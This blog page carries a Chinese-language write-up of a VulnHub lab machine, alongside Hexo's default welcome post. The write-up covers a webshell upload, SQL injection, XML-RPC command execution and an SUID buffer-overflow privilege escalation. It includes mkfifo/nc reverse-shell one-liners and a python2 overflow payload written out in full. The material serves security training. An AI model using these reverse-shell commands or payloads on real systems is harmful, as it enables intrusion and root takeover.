<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Hexo</title>

  
  <meta name="author" content="John Doe">
  

  

  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  

  <meta property="og:site_name" content="Hexo"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 6.0.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">Hexo</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    
  <article>

  
    
    <h3 class="article-title"><a href="/2022/03/01/5 靶场五(xmlrpc+缓冲区溢出+汇编动态调试)/"><span></span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2022/03/01/5 靶场五(xmlrpc+缓冲区溢出+汇编动态调试)/" rel="bookmark">
        <time class="entry-date published" datetime="2022-03-01T13:24:24.206Z">
          2022-03-01
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <pre><code>title:记一次打靶vulnhub                
vulnhub打靶第五天
</code></pre>
<p>nmap扫描主机端口及服务</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118163326618.png" alt="image-20220118163326618"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118163406033.png" alt="image-20220118163406033"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118163445578.png" alt="image-20220118163445578"></p>
<p>访问web服务端，不支持get，改请求方式</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118163704234.png" alt="image-20220118163704234"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118163923369.png" alt="image-20220118163923369"></p>
<p>get方法不行</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118164034894.png" alt="image-20220118164034894"></p>
<p>改为options也不支持</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118164134999.png" alt="image-20220118164134999"></p>
<p>端口改为80端口</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118164259423.png" alt="image-20220118164259423"></p>
<p>申请账号</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118164724847.png" alt="image-20220118164724847"></p>
<p>进入网站，看到管理员提示monitor.py</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118165101151.png" alt="image-20220118165101151"></p>
<p>有上传图片的功能</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118165302575.png" alt="image-20220118165302575"></p>
<p>上传一个php马，使用蚁剑连接</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118172742302.png" alt="image-20220118172742302"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118172859103.png" alt="image-20220118172859103"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118172940933.png" alt="image-20220118172940933"></p>
<p>可能存在其他漏洞</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118173056182.png" alt="image-20220118173056182"></p>
<p>有sql注入</p>
<p>使用sqlmap注入，抓包将数据包复制到一个文件a</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118173355679.png" alt="image-20220118173355679"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118173509103.png" alt="image-20220118173509103"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118173552237.png" alt="image-20220118173552237"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118173723935.png" alt="image-20220118173723935"></p>
<p>数据库为socialnetwork</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118173759911.png"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118173923488.png" alt="image-20220118173923488"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118174047524.png" alt="image-20220118174047524"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118174103352.png" alt="image-20220118174103352"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118174156792.png" alt="image-20220118174156792"></p>
<p>发现了像hash值得东西，是否爆破</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118174234625.png" alt="image-20220118174234625"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118174300171.png" alt="image-20220118174300171"></p>
<p>破解出来admin账号密码，并且进行登陆</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118174402921.png" alt="image-20220118174402921"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118174520405.png" alt="image-20220118174520405"></p>
<p>登陆进来跟普通用户差不多，一样的webshell</p>
<p>查看系统信息</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118174833770.png" alt="image-20220118174833770"></p>
<p>使用Ubuntu 18.04.1的exp<img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118175646366.png" alt="image-20220118175646366"></p>
<p>编译运行c文件运行</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118175746887.png" alt="image-20220118175746887"></p>
<p>蚁剑功能不全，提权失败，反弹shell到nc</p>
<p>nc不支持 -e参数，可以使用nc串联，还可以使用系统命令</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118175900864.png" alt="image-20220118175900864"></p>
<p>rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;bash -i 2&gt;&amp;1|nc 10.0.2.15 4444 &gt;&#x2F;tmp&#x2F;f</p>
<p>mkfifo是一个先进先出的堆栈效果创建一个 &#x2F;tmp&#x2F;f 对象，通过这个对象来中转执行bash的效果，再通过管道将执行结果输出到指定的kali机器</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118181458036.png" alt="image-20220118181458036"></p>
<p>成功反弹shell 到kali</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118181642161.png" alt="image-20220118181642161"></p>
<p>为了保证shell可以进行交互式的操作，使用python获取一个新的shell，升级</p>
<p>python -c “import pty; pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118182426294.png" alt="image-20220118182426294"></p>
<p>在执行exp，提权成功（2021年的exp，2020年的靶机）</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118182512683.png" alt="image-20220118182512683"></p>
<p>其他方式提权</p>
<p>首先进行信息收集 cat &#x2F;etc&#x2F;passwd,标记用户有bash登陆权限</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118182939730.png" alt="image-20220118182939730"></p>
<p>进入home目录，看是否有socnet用户目录</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118183034690.png" alt="image-20220118183034690"></p>
<p>根据提示，py文件已经运行，验证一下</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118183448566.png" alt="image-20220118183448566"></p>
<p>查看py文件是一个远程服务器接口api</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118185836917.png" alt="image-20220118185836917"></p>
<p>xmlrpc</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118190622161.png" alt="image-20220118190622161"></p>
<p>定义了几个函数，通过runcmd产生一个新的进程，产生一个新的shell，在shell当中执行这条命令，执行的结果或报错通过函数进行返回</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118190832588.png" alt="image-20220118190832588"></p>
<p>如果passcode&#x3D;debugging_pass就会再次执行cmd，服务端如果要通过xmlrpc的api接口执行我们想让他执行的操作系统指令，就要知道passcode，也就是debugging_pass（1000，9999）</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118192201725.png" alt="image-20220118192201725"></p>
<p>说明这个服务器只接受xmlrpc这种方式的请求，之前尝试各种请求方式访问8000端口都不行</p>
<p>服务端将上面所有函数都注册到了服务器端，只要知道函数名称的客户端，通过xmlrpc方法都可以向服务端发起请求</p>
<p>利用这一段代码</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118192530928.png" alt="image-20220118192530928"></p>
<p>测试代码</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118193118660.png" alt="image-20220118193118660"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118193641167.png" alt="image-20220118193641167"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118193856992.png" alt="image-20220118193856992"></p>
<p>编辑攻击代码</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118194524209.png" alt="image-20220118194524209"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118194658982.png" alt="image-20220118194658982"></p>
<p>获得了passcode过后，构造反弹shell的代码，同时开启监听</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118195836678.png" alt="image-20220118195836678"></p>
<p>成功反弹了shell</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118195914416.png" alt="image-20220118195914416"></p>
<p>再使用python脚本使交互性更强</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118200056701.png" alt="image-20220118200056701"></p>
<p>成为socnet用户后，可以进入home目录，此时就是socnet权限</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118200330081.png" alt="image-20220118200330081"></p>
<p>add_record是一个执行程序开启了suid和sgid权限，如果程序有漏洞，可以通过漏洞实现代码执行，利用root权限来反弹shell，获得的shell就是root权限</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118200450775.png" alt="image-20220118200450775"></p>
<p>寻找突破口，python中的peda是一个基于gdb的调试脚本，对gdb进行动态调试，可能有内存溢出的漏洞</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118200925590.png" alt="image-20220118200925590"></p>
<p>使用gdb调试add_record看是否有内存溢出（缓冲区溢出，堆溢出）</p>
<p>首先熟悉add_record的功能</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118201846590.png" alt="image-20220118201846590"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118202042872.png" alt="image-20220118202042872"></p>
<p>找到几个提交数据的入口点，来挨个测试是否存在内存溢出漏洞，gdb是一个程序的动态调试工具</p>
<p>跟踪监视程序运行过程中，寄存器，内存，堆栈的使用情况，每一次的函数调用每一次的数据变化</p>
<p>使用gdb是因为本机有peda，peda是基于gdb的python脚本，在调试结果中，对内存进行监控</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118202832438.png" alt="image-20220118202832438"></p>
<p>输入 r 让程序执行</p>
<p>在数据提交位置输入大量的A监视内存的变化，如果变量存在缓冲区溢出，导致了内存溢出覆盖到了其他的寄存器位置的话，就可以通过判断其他寄存器位置里的数据是否是A，通过这个结果迹象，来判断注入的数据是否成功的溢出到了其他寄存器里面，进而通过进一步探测去利用修改寄存器里面的具体位置的具体值，进而实现代码的加载执行</p>
<p>写一个python脚本，生成大量的A</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118203740306.png" alt="image-20220118203740306"></p>
<p>输入500个A到第一个数据提交点，程序正常退出了，这个位置可能没有内存溢出</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118203922584.png" alt="image-20220118203922584"></p>
<p>第二个入口点跟第一个一样</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118204128556.png" alt="image-20220118204128556"></p>
<p>第三个入口点一样没溢出</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118204250036.png" alt="image-20220118204250036"></p>
<p>第四个入口点还是没有</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118204344755.png" alt="image-20220118204344755"></p>
<p>最后个入口点出现问题，堆栈出现大量的A，这个变量的提交位置没有做好内存范围的限制，A溢出出来，堆栈出现大量的A，重点关注EIP寄存器，EIP寄存器是cpu接下来要运行的下一条指令放置的内存地址的编号，EIP被A覆盖，若知道是哪个A就可以精准的将payload的内存地址放入EIP，cpu运行这个指令的时候就能从EIP寄存器读取这个地址，进而找到地址里存放的代码，也就是我们的payload，就可以反弹shell获得root权限。普遍适用。</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118204455294.png" alt="image-20220118204455294"></p>
<p>试试是哪个位置发生了溢出</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118205108664.png" alt="image-20220118205108664"></p>
<p>200个A发生了溢出</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118205206537.png" alt="image-20220118205206537"></p>
<p>100个A依然发生溢出</p>
<p>gdb可以生成特殊字符，生成100个特殊字符，连续的每4个字符都不相同，就可以判断是哪四个字符，定位字符就可以放成payload的地址</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118205347610.png" alt="image-20220118205347610"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118205637269.png" alt="image-20220118205637269"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118205655049.png" alt="image-20220118205655049"></p>
<p>使用pattern search寻找溢出的特殊字符位置是62</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118205845879.png" alt="image-20220118205845879"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118205909875.png" alt="image-20220118205909875"></p>
<p>首先注入一个bcde，注入成功</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118210133680.png" alt="image-20220118210133680"></p>
<p>查看一下汇编代码</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118210321025.png" alt="image-20220118210321025"></p>
<p>fopen，是c语言的一个内建函数，汇编中是用来打开文件的，可能是打开txt文件的</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118210517787.png" alt="image-20220118210517787"></p>
<p>put也是内建函数，输出一些内容，将内容显示出来，对put之前的第一个地址设置断点（程序执行到这里就停）</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118211348990.png" alt="image-20220118211348990"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118211408510.png" alt="image-20220118211408510"></p>
<p>s命令是单步向前执行，每次只执行一个cpu指令</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118211537650.png" alt="image-20220118211537650"></p>
<p>这个功能已经搞清楚，删除此断点，设置下一个断点</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118211757133.png" alt="image-20220118211757133"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118211925815.png" alt="image-20220118211925815"></p>
<p>输入用户名aa后触及到断点</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118212001849.png" alt="image-20220118212001849"></p>
<p>单步跟进，接下来显示的内容是 years worked（int）：</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118212151222.png" alt="image-20220118212151222"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118210548489.png" alt="image-20220118210548489"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118210613472.png" alt="image-20220118210613472"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118210633605.png" alt="image-20220118210633605"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118210650594.png" alt="image-20220118210650594"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118210705857.png" alt="image-20220118210705857"></p>
<p>vuln没有@plt说明不是系统内建函数，是软件开发者自己写的函数</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118212644279.png" alt="image-20220118212644279"></p>
<p>查看系统有哪些函数</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118212911308.png" alt="image-20220118212911308"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118212953332.png" alt="image-20220118212953332"></p>
<p>存在调用系统功能的函数，类似php的exec</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118213121399.png" alt="image-20220118213121399"></p>
<p>查看vuln函数，可以查看strcpy（内建函数）函数的漏洞</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118213339402.png" alt="image-20220118213339402"></p>
<p>查看backdoor函数，调用了suid，system函数，尝试执行操作系统指令，取得这个函数的内存地址，通过explain之后，把这个地址放入EIP寄存器，进而EIP寄存器就会读取这个地址下面的这些指令，进而就会执行到请求suid的指令，请求执行system的指令，看看利用函数调用的系统指令进行提权</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118213620450.png" alt="image-20220118213620450"></p>
<p>查看主程序，执行explain过后会调用vuln函数，vuln函数又会调用存在缓冲区溢出漏洞的strcpy函数，当我们注入一些特殊符号就会导致缓冲区溢出漏洞的出现，但是主函数没有直接调用backdoor这个函数的，所以必须利用主程序中加载vuln函数，对他进行缓冲区溢出向EIP寄存器写入backdoor函数的起始内存加载地址，进而通过vuln的漏洞执行backdoor函数，然后通过backdoor函数去执行suid这个系统函数，system函数，进而执行到system函数中他要执行的操作系统的命令，看有没有机会执行paylaod实现本地提权的目标</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118214209100.png" alt="image-20220118214209100"></p>
<p>回来再看源码45 44 43 42 分别是EDCB的ascii编码，顺序颠倒了，cpu架构的大头和小头，因此backdoor函数的起始内存地址写入到EIP寄存器的时候必须按照颠倒的顺序，不然无法正确指向backdoor的内存地址</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118215143775.png" alt="image-20220118215143775"></p>
<p>再次查看 backdoor内存地址，复制地址</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118215512221.png" alt="image-20220118215512221"></p>
<p>再使用python构造payload</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118222257426.png" alt="image-20220118222257426"></p>
<p>将python2 -c “import struct; print(‘aa\n1\n1\n1\n’ + ‘A’*62 + struct.pack(‘I’,0x08048676))” &gt; payload复制，在当前靶机目录下生成payload文件</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118222503775.png" alt="image-20220118222503775"></p>
<p>将payload文件一次性输入给程序，看是否会发生溢出</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118222709275.png" alt="image-20220118222709275"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118222733127.png" alt="image-20220118222733127"></p>
<p>产生了新的进程 3220 执行了一个新的进程，新的进程执行了一个新的程序来执行&#x2F;bin&#x2F;dash</p>
<p>又创建了一个另外一个进程来执行&#x2F;bin&#x2F;bash ，在A后面拼接了一个backdoor函数的内存起始地址，通过它自身vuln函数里面存在的缓冲区溢出漏洞，去执行backdoor函数里面的system，执行结果是执行了dash和bash</p>
<p>原因：</p>
<p>在vuln函数这里设置断点，执行到这个函数单步跟进，继续加载payload，按s跟进</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118223645439.png" alt="image-20220118223645439"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118223743948.png" alt="image-20220118223743948"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118224021680.png" alt="image-20220118224021680"></p>
<p>n和s跟进到出现backdoor</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118224211813.png" alt="image-20220118224211813"></p>
<p>跟到这里，注入的其实内存地址正确被加载。执行到suid了，继续跟到system</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118224331438.png" alt="image-20220118224331438"></p>
<p>一直跟进到system函数</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118224813010.png" alt="image-20220118224813010"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118224956242.png" alt="image-20220118224956242"></p>
<p>将系统要执行的指令push到eax，然后交给cpu执行，cpu执行的结果就是&#x2F;bin&#x2F;bash</p>
<p>vuln的漏洞来自于strcpy存在的缓冲区溢出漏洞，它调用了这个函数，因此vuln存在缓冲区溢出漏洞，当我们在explain输入数据时，数据会导致vuln缓冲区溢出漏洞触发，从而改写EIP寄存器中的地址，进而通过改写的地址将backdoor这个函数他的在内存当中的内存地址给他写入到eip寄存器里，通过vuln函数的弱点加载了backdoor函数，backdoor函数调用了system，和suid函数，因为他的属主是root，就是以root权限执行这个程序，执行这个程序当中调用的system系统函数，而system系统函数又执行的最终请求cpu给他执行的是&#x2F;bin&#x2F;bash的shell，通过内存的跟踪分析，查看它的汇编语言代码，最后找到了漏洞的存在位置，只要能正常触发这个漏洞的执行，最终就可以通过这个函数执行bash，而这个bash将是以root权限来运行的</p>
<p>利用payload触发这个程序的漏洞，进而给我们返回一个root权限的shell，提权成功<img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118230053581.png" alt="image-20220118230053581"></p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118230143686.png" alt="image-20220118230143686"></p>
<p>反弹shell    rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;bash -i 2&gt;&amp;1|nc 10.0.2.15 3333 &gt;&#x2F;tmp&#x2F;f</p>
<p><img src="C:\Users\65611\AppData\Roaming\Typora\typora-user-images\image-20220118230532036.png" alt="image-20220118230532036"></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2022/03/01/hello-world/"><span>Hello World</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2022/03/01/hello-world/" rel="bookmark">
        <time class="entry-date published" datetime="2022-03-01T10:35:12.156Z">
          2022-03-01
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    

    </div>

    
  </div>
</article>




<nav class="pagination">
  
  
</nav>
    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2022 John Doe
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>